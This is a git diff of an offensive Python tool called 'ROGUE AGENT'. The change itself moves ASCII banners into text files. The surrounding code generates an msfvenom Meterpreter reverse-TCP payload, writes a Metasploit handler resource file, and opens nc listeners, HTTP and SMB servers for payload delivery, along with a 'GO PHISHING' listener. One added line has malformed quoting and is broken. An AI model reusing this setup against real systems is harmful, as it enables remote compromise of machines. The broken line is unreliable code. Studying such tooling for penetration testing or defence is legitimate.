@@ -192,52 +192,6 @@ def keys():
    print("\tHKEY_CURRENT_CONFIG HKCC")
    return
    
-def banner1():
-   print("\t\t ____   ___   ____ _   _ _____      _    ____ _____ _   _ _____   ")
-   print("\t\t|  _ \ / _ \ / ___| | | | ____|    / \  / ___| ____| \ | |_   _|  ")
-   print("\t\t| |_) | | | | |  _| | | |  _|     / _ \| |  _|  _| |  \| | | |    ")
-   print("\t\t|  _ <| |_| | |_| | |_| | |___   / ___ \ |_| | |___| |\  | | |    ")
-   print("\t\t|_| \_\\\\___/ \____|\___/|_____| /_/   \_\____|_____|_| \_| |_|  ")
-   print("\t\t                                                                  ")
-   print("\t\t      BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)        ")
-   print("\t\t                                                                  ")
-   return
-     
-def banner3():
-   with open("banner.tmp", "w") as banner:
-      banner.write("\t\t ____  __  __ ____    ____  _____ ______     _______ ____   \n") 
-      banner.write("\t\t/ ___||  \/  | __ )  / ___|| ____|  _ \ \   / / ____|  _ \  \n")
-      banner.write("\t\t\___ \| |\/| |  _ \  \___ \|  _| | |_) \ \ / /|  _| | |_) | \n")
-      banner.write("\t\t ___) | |  | | |_) |  ___) | |___|  _ < \ V / | |___|  _ <  \n")
-      banner.write("\t\t|____/|_|  |_|____/  |____/|_____|_| \_\ \_/  |_____|_| \_\ \n")
-      banner.write("\t\t                                                            \n")
-      banner.write("\t\t   BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)    \n")
-      banner.write("                                                                \n")
-   return
-
-def banner4():
-   with open("banner.tmp", "w") as banner:
-      banner.write("\t\t __  __ _____ _____ _____ ____  ____  ____  _____ _____ _____ ____   \n")
-      banner.write("\t\t|  \/  | ____|_   _| ____|  _ \|  _ \|  _ \| ____|_   _| ____|  _ \  \n")
-      banner.write("\t\t| |\/| |  _|   | | |  _| | |_) | |_) | |_) |  _|   | | |  _| | |_) | \n")
-      banner.write("\t\t| |  | | |___  | | | |___|  _ <|  __/|  _ <| |___  | | | |___|  _ <  \n") 
-      banner.write("\t\t|_|  |_|_____| |_| |_____|_| \_\_|   |_| \_\_____| |_| |_____|_| \_\ \n")
-      banner.write("\t\t                                                                     \n")
-      banner.write("\t\t       BY TERENCE BROADBENT BSC CYBER SECURITY (FIRST CLASS)         \n")
-      banner.write("                                                                         \n")
-   return   
-   
-def banner5():
-   with open("banner.tmp", "w") as banner:
-      banner.write("  ____  ___    ____  _   _ ___ ____  _   _ ___ _   _  ____ \n")
-      banner.write(" / ___|/ _ \  |  _ \| | | |_ _/ ___|| | | |_ _| \ | |/ ___|\n")
-      banner.write("| |  _| | | | | |_) | |_| || |\___ \| |_| || ||  \| | |  _ \n")
-      banner.write("| |_| | |_| | |  __/|  _  || | ___) |  _  || || |\  | |_| |\n")
-      banner.write(" \____|\___/  |_|   |_| |_|___|____/|_| |_|___|_| \_|\____|\n")
-      banner.write("                                                           \n")
-      banner.write("   BY TERENCE BROADBENT BSc CYBERSECURITY (FIRST CLASS)    \n")
-   return
-   
 def checkInterface(variable):
    print("[*] Checking network interface...\n")
    try:      
@@ -514,7 +468,7 @@ def options():
 
 command("clear")
 command("xdotool key Alt+Shift+S; xdotool type 'ROGUE AGENT'; xdotool key Return")
-banner1()
+command("clear; cat " + dataDir + "/banner1.txt")
 print("[*] Booting program, please wait...")
 print("[+] Using localhost IP address " + localIP + "...")
 
@@ -671,11 +625,10 @@ command("msfvenom -p windows/meterpreter/reverse_tcp LHOST=" + localIP + " LPORT
 # -------------------------------------------------------------------------------------
 
 print("[*] Starting HTTP server...")
-banner2()
 command("xdotool key Ctrl+Shift+T; sleep 2")
 command("xdotool key Alt+Shift+S; xdotool type 'HTTP SERVER'; xdotool key Return; sleep 2")
-command("xdotool type 'cat banner.tmp'; xdotool key Return")
-command("xdotool type 'cat banner.tmp'; xdotool key Return")
+command("xdotool type 'clear; cat " + dataDir + "/banner1.txt; cat " + dataDir + "/banner2.txt'; xdotool key Return")
+
 command("xdotool type 'python3 -m http.server 80'; xdotool key Return; sleep 2")
 command("xdotool type 'rlwrap nc -nvlp 80'; xdotool key Return; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
@@ -689,10 +642,9 @@ command("xdotool key Ctrl+Shift+Tab; sleep 2")
 # -------------------------------------------------------------------------------------
 
 print("[*] Starting SMB server...")
-banner3()
 command("xdotool key Ctrl+Shift+T; sleep 2")
 command("xdotool key Alt+Shift+S; xdotool type 'SMB SERVER'; xdotool key Return; sleep 2")
-command("xdotool type 'cat banner.tmp'; xdotool key Return")
+command("xdotool type 'clear; cat " + dataDir + "/banner3.txt'; xdotool key Return")
 command("xdotool type 'impacket-smbserver C:\\tmp " + httpDir + "/ -smb2support'; xdotool key Return; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
 command("xdotool key Ctrl+Shift+Tab; sleep 2")
@@ -706,13 +658,12 @@ command("xdotool key Ctrl+Shift+Tab; sleep 2")
 # -------------------------------------------------------------------------------------
 
 print("[*] Starting metasploit server...")
-banner4()
 with open("meterpreter.rc", "w") as write:
    write.write("use exploit/multi/handler\n")
    write.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
    write.write("set LHOST " + localIP + "\n")
    write.write("clear\n")
-   write.write("cat banner.tmp\n")
+   write.write("cat " + dataDir + "/banner4.txt\n")
    write.write("run\n")   
 command("xdotool key Ctrl+Shift+T; sleep 2")
 command("xdotool key Alt+Shift+S; xdotool type 'METERPRETER SHELL'; xdotool key Return; sleep 2")
@@ -2458,8 +2409,7 @@ while True:
       if checkParams != 1:
          command("xdotool key Ctrl+Shift+T")
          command("xdotool key Alt+Shift+S; xdotool type 'GO PHISHING'; xdotool key Return; sleep 2")
-         banner5()
-         command("xdotool type 'cat banner.tmp'; xdotool key Return")
+         command("xdotool type 'clear; cat ; + dataDir + '/banner5.txt'; xdotool key Return")
          command("xdotool type 'nc -nvlp 80'; xdotool key Return")
          command("xdotool key Ctrl+Shift+Tab")
          command("xdotool key Ctrl+Shift+Tab") # extra screens open
